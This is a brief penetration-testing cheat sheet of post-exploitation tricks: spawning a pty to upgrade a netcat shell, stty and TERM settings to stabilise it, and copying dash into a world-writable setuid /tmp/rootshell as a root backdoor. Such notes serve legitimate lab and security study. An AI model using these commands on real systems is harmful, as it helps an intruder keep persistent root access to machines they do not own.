# Misc

## Tricks to upgrade shell on bad netcat connection

python -c 'import pty; pty.spawn("/bin/bash")'
 
## Upgrade shell trick
 
$ reset\
$ export SHELL=bash\
$ export TERM=xterm-256color\
$ stty -raw echo\
$ stty rows \<num\> columns \<cols\>

## List columns and rows on terminal
stty -a\
stty size

## Privilege shell

```sh
cp /bin/dash /tmp/rootshell; chmod 4777 /tmp/rootshell
/tmp/rootshell -p
```
